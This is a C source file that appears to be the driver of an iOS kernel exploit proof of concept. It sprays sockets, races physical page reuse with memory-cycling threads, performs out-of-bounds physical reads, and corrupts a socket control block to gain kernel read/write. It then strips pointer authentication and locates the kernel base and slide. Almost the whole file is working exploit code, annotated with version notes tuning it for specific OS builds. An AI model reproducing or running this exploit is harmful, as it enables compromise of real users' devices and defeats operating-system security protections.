// poc.c
// Lumina P007OpenOnly - 64788 KRW Focus V24
// V44: Anonymous VM cycler (replaces IOSurface cycler), removed mlock
//
// V43 used IOSurface cycler which cycles PurpleGfxMem (Pool 2)
// V44 uses anonymous VM cycler which cycles the SAME pool the race reads (Pool 1)
// This matches what LuminaKRW did when it got different Q0 values

#include "common.h"
#include "free_thread.h"
#include "krw.h"
#include "phys_oob.h"
#include "socket.h"
#include "surface.h"
#include "utils.h"
#include "lumina_offsets.h"

#include <mach-o/dyld.h>
#include <mach/mach_time.h>
#include <dispatch/dispatch.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sysctl.h>

// ACTUAL DEFINITIONS FOR GLOBAL VARIABLES
pe_context_t g_ctx;
offsets_t g_offsets;
volatile int churn_go = 0;

#define CS_MAX_OUTER_LOOPS 3
#define CS_MAX_SEARCH_MAPPINGS 5

kern_return_t pe_init(void) {
    init_target_file();
    if (g_ctx.executable_name[0] == '\0') {
        uint32_t size = 0x1024;
        char* executable_path = calloc(1, size);
        if (_NSGetExecutablePath(executable_path, &size) == 0) {
            char* executable_name = strrchr(executable_path, '/');
            if (executable_name != NULL) {
                executable_name = executable_name + 1;
            } else {
                executable_name = executable_path;
            }
            strncpy(g_ctx.executable_name, executable_name, sizeof(g_ctx.executable_name) - 1);
            g_ctx.executable_name[sizeof(g_ctx.executable_name) - 1] = '\0';
        }
        free(executable_path);
    }

    g_ctx.shared = calloc(1, sizeof(free_thread_shared_t));
    pthread_create(&g_ctx.free_thread, NULL, free_thread_worker, g_ctx.shared);
    g_ctx.free_thread_started = true;

    LOG("free_thread_shared: %p", g_ctx.shared);
    return KERN_SUCCESS;
}

// V43: Anonymous VM cycler — cycles the SAME physical pages the race reads
static void *vm_cycler_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    
    while (churn_go) {
        // Allocate and immediately deallocate anonymous memory
        // This cycles physical pages in the SAME pool as the search mapping
        for (int i = 0; i < 16; i++) {
            mach_vm_address_t addr = 0;
            mach_vm_size_t sz = 0x4000;  // 1 page
            
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, sz,
                                                VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) continue;
            
            // Write a pattern so we can detect if this page gets reused
            memset((void *)addr, 0x41 + i, sz);
            
            // Immediately deallocate — physical page returns to free pool
            mach_vm_deallocate(mach_task_self(), addr, sz);
        }
        usleep(50);  // Fast cycling
    }
    return NULL;
}

// V44: Second VM cycler with larger allocations
// Cycles multi-page allocations to stress the physical page allocator
static void *vm_cycler_large_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
    
    uint64_t cycled = 0;
    
    while (churn_go) {
        // Allocate larger chunks (64KB = 4 pages)
        // This forces the allocator to find contiguous physical pages
        // which churns the free pool more aggressively
        mach_vm_address_t addr = 0;
        mach_vm_size_t sz = 0x40000;  // 256KB = 16 pages
        
        kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, sz,
                                            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            usleep(100);
            continue;
        }
        
        // Touch all pages to ensure they're allocated
        for (uint64_t off = 0; off < sz; off += 0x4000) {
            *(volatile uint64_t *)(addr + off) = 0x42424242;
        }
        
        // Deallocate — 16 physical pages return to free pool at once
        mach_vm_deallocate(mach_task_self(), addr, sz);
        cycled++;
        usleep(100);
    }
    
    LOG("vm_cycler_large: cycled %llu chunks (%llu pages)", cycled, cycled * 16);
    return NULL;
}

kern_return_t pe_v1(void) {
    uint64_t search_mapping_size = 0x1000 * vm_page_size;
    uint64_t n_of_search_mappings = CS_MAX_SEARCH_MAPPINGS;

    uint8_t* read_buffer = calloc(1, g_ctx.oob_size);
    uint8_t* write_buffer = calloc(1, g_ctx.oob_size);

    uint64_t contiguous_mapping_size = 2 * vm_page_size;
    initialize_physical_read_write(contiguous_mapping_size);

    uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT] = {0};
    size_t target_inp_gencnt_count = 0;

    // V44: Declare cycler tids BEFORE the loop
    pthread_t vm_cycler_tid = 0;
    pthread_t vm_cycler_large_tid = 0;

    int outer_loop = 0;
    while (!cs_expired() && outer_loop < CS_MAX_OUTER_LOOPS) {
        outer_loop++;
        LOG("=== outer loop %d/%d ===", outer_loop, CS_MAX_OUTER_LOOPS);

        uint64_t socket_spray_count = 1000;
        LOG("spraying %lu sockets...", socket_spray_count);
        
        for (uint64_t socket_count = 0; socket_count < socket_spray_count; socket_count++) {
            uint64_t port = spray_socket();
            if (port == UINT64_MAX) {
                LOG("failed to spray sockets: %#lx", g_ctx.socket_ports_count);
                break;
            }
        }
        LOG("sprayed %lu sockets", g_ctx.socket_ports_count);

        if (g_ctx.socket_ports_count == 0) {
            LOG("ERROR: No sockets sprayed, aborting");
            free(read_buffer);
            free(write_buffer);
            return KERN_FAILURE;
        }

        uint64_t start_pcb_id = g_ctx.socket_pcb_ids[0];
        uint64_t end_pcb_id = g_ctx.socket_pcb_ids[g_ctx.socket_ports_count - 1];
        LOG("socket_ports_count: %lu", g_ctx.socket_ports_count);
        LOG("start_pcb_id: %#llx", start_pcb_id);
        LOG("end_pcb_id: %#llx", end_pcb_id);

        churn_go = 1;
        pthread_t churn_tid;
        pthread_create(&churn_tid, NULL, churn_thread, NULL);
        LOG("socket churn thread started");

        // V44: Start anonymous VM cyclers (NOT IOSurface cyclers)
        // These cycle the SAME physical page pool the race reads from
        pthread_create(&vm_cycler_tid, NULL, vm_cycler_thread, NULL);
        LOG("VM cycler thread started (anonymous, 1-page)");
        pthread_create(&vm_cycler_large_tid, NULL, vm_cycler_large_thread, NULL);
        LOG("VM cycler large thread started (anonymous, 16-page)");

        bool success = false;
        for (size_t s = 0; s < n_of_search_mappings; s++) {
            if (cs_expired()) break;
            mach_vm_address_t search_mapping_address = 0;
            kern_return_t kr = mach_vm_allocate(mach_task_self(), &search_mapping_address, search_mapping_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
            if (kr != KERN_SUCCESS) {
                LOG("failed to allocate search mapping %lu: %d", s, kr);
                continue;
            }
            
            for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
                memcpy((void*)(search_mapping_address + k), &g_ctx.random_marker, sizeof(g_ctx.random_marker));
            }

            LOG("looking in search mapping: %lu", s);

            memory_object_size_t memory_object_size = search_mapping_size;
            mach_port_t memory_object = MACH_PORT_NULL;
            kr = mach_make_memory_entry_64(mach_task_self(), &memory_object_size, search_mapping_address, VM_PROT_DEFAULT, &memory_object, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) {
                LOG("failed to create memory object %lu: %d", s, kr);
                mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);
                continue;
            }

            // V44 FIX: Do NOT mlock the search mapping. Wired pages cannot be remapped on 23F77.
            // surface_mlock(search_mapping_address, search_mapping_size);

            uint64_t max_offsets = 25;
            uint64_t seeking_offset = 0;
            
            while (seeking_offset <= search_mapping_size - contiguous_mapping_size) {
                if (cs_expired()) break;
                if ((seeking_offset & 0x7FFFFF) == 0) {
                    LOG("scan: mapping %lu offset %#llx (oob reads so far: %llu)", s, seeking_offset, g_ctx.success_read_count);
                }
                kr = physical_oob_read_mo(memory_object, seeking_offset, g_ctx.oob_size, g_ctx.oob_offset, read_buffer);
                if (kr == KERN_SUCCESS) {
                    LOG("oob read success at offset %#llx", seeking_offset);
                    if (find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, &target_inp_gencnt_count, false) == KERN_SUCCESS) {
                        success = true;
                        break;
                    }
                }
                seeking_offset += vm_page_size;
                max_offsets--;
                if (max_offsets == 0) break;
                
                usleep(5000);
            }

            kr = mach_port_deallocate(mach_task_self(), memory_object);
            if (kr != KERN_SUCCESS) {
                LOG("failed to deallocate memory object %lu: %d", s, kr);
            }

            mach_vm_deallocate(mach_task_self(), search_mapping_address, search_mapping_size);

            if (success) {
                break;
            }
        }

        // Stop churn thread
        churn_go = 0;
        pthread_join(churn_tid, NULL);
        LOG("socket churn thread stopped");

        // V44: Join VM cyclers
        pthread_join(vm_cycler_tid, NULL);
        LOG("VM cycler thread stopped");
        pthread_join(vm_cycler_large_tid, NULL);
        LOG("VM cycler large thread stopped");

        sockets_release();

        for (size_t i = 0; i < g_ctx.mlock_surfaces_count; i++) {
            if (g_ctx.mlock_surfaces[i].surface) {
                CFRelease(g_ctx.mlock_surfaces[i].surface);
                g_ctx.mlock_surfaces[i].surface = NULL;
                g_ctx.mlock_surfaces[i].address = 0;
            }
        }
        g_ctx.mlock_surfaces_count = 0;

        if (success) {
            break;
        }
    }

    free(read_buffer);
    free(write_buffer);
    return KERN_SUCCESS;
}

static uint64_t __attribute((naked)) __xpaci(uint64_t a)
{
    asm(".long        0xDAC143E0"); // XPACI X0
    asm("ret");
}

bool is_arm64e(void)
{
    static bool isArm64e = false;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        cpu_subtype_t cpusubtype = 0;
        size_t len = sizeof(cpusubtype);
        sysctlbyname("hw.cpusubtype", &cpusubtype, &len, NULL, 0);
        isArm64e = (cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;
    });
    return isArm64e;
}

uint64_t unpac_ptr(uint64_t kptr)
{
    if (is_arm64e()) {
        return __xpaci(kptr);
    }
    else {
        return kptr;
    }
}

kern_return_t pe(void) {
    char* device_machine = get_device_machine();

    (void)device_machine;
    LOG("running pe_v1 (A14 23F77 pins: icmp6filt=0x%x usecount=0x%x)",
        LUMINA_INPCB_ICMP6FILT, LUMINA_SOCKET_USECOUNT);
    LOG("cluster_*_contig EINVAL unless UPL_PHYS_CONTIG (26.1). Q0!=marker is NOT kread.");
    LOG("running pe_v1 (A12 path)");
    pe_init();
    pe_v1();

    LOG("highiest_success_idx: %llu", g_ctx.highiest_success_idx);
    LOG("success_read_count: %llu", g_ctx.success_read_count);

    if (cs_expired() || g_ctx.control_socket == 0 || g_ctx.rw_socket == 0) {
        LOG_ERR("no control/rw socket pair — PCB hunt did not land this run");
        return KERN_FAILURE;
    }

    // cleanup
    atomic_store_explicit(&g_ctx.shared->go_sync, 0, memory_order_seq_cst);
    atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
    pthread_join(g_ctx.free_thread, NULL);

    // we have stable rw, we can close the fds now
    close(g_ctx.write_fd);
    close(g_ctx.read_fd);
    g_ctx.control_socket_pcb = early_kread64(g_ctx.rw_socket_pcb + g_ctx.offsets.inpcb_inp_socket);

    uint64_t textPtr = 0;
    // iOS 17+ path (18.7.5): pcbinfo -> ipi_zone -> kalloc_type_view name
    uint64_t pcbinfo_pointer = early_kread64(g_ctx.control_socket_pcb + g_ctx.offsets.inpcb_inp_socket);
    uint64_t ipi_zone = early_kread64(pcbinfo_pointer + g_ctx.offsets.map_pmap);
    textPtr = early_kread64(ipi_zone + g_ctx.offsets.map_pmap);

    uint64_t kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
    while (!cs_expired()) {
        if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
            uint64_t typeinfo = early_kread64(kernel_base + 8);

            if (is_arm64e()) {
                if (typeinfo == 0xc00000002) break;
                if (typeinfo == 0xcc0000002) break;
            }
            else {
                if (typeinfo == 0x200000000) break;
            }
        }
        kernel_base -= PAGE_SIZE;
    }

    g_ctx.kernel_base = kernel_base;
    g_ctx.kernel_slide = kernel_base - LUMINA_STATIC_BASE;

    // real cleanup
    krw_sockets_leak_forever();
    return KERN_SUCCESS;
}

int clearsword_run(void) {
    mach_timebase_info_data_t timebase;
    mach_timebase_info(&timebase);
    uint64_t start = mach_absolute_time();

    memset(&g_offsets, 0, sizeof(g_offsets));
    memset(&g_ctx, 0, sizeof(g_ctx));
    g_ctx.target_file_size = TARGET_FILE_SIZE;
    g_ctx.oob_offset = 0x100;
    g_ctx.oob_size = 0xf00;
    g_ctx.n_of_oob_pages = 2;

    arc4random_buf(&g_ctx.random_marker, sizeof(g_ctx.random_marker));
    arc4random_buf(&g_ctx.wired_page_marker, sizeof(g_ctx.wired_page_marker));

    g_ctx.default_file_content = calloc(1, g_ctx.target_file_size);
    memset_pattern8(g_ctx.default_file_content, &g_ctx.random_marker, g_ctx.target_file_size);

    g_ctx.getsockopt_read_data = calloc(1, 32);
    int ret = 0;

    if (offsets_init() != 0) {
        LOG_ERR("offsets_init failed");
        ret = -1;
        goto cleanup;
    }
    g_ctx.offsets = g_offsets;

    kern_return_t kr = pe();
    if (kr != KERN_SUCCESS) {
        LOG_ERR("pe failed: %s (%d)", mach_error_string(kr), kr);
        ret = kr;
        goto cleanup;
    }

    LOG("kernel_base: %#llx", g_ctx.kernel_base);
    LOG("kernel_slide: %#llx", g_ctx.kernel_slide);

    uint64_t end = mach_absolute_time();
    uint64_t elapsed = end - start;
    double elapsed_ms = (double)elapsed * timebase.numer / timebase.denom / 1e6;
    LOG("Time taken for KRW: %.3f ms", elapsed_ms);

cleanup:
    free(g_ctx.shared);
    free(g_ctx.default_file_content);
    free(g_ctx.getsockopt_read_data);

    return ret;
}
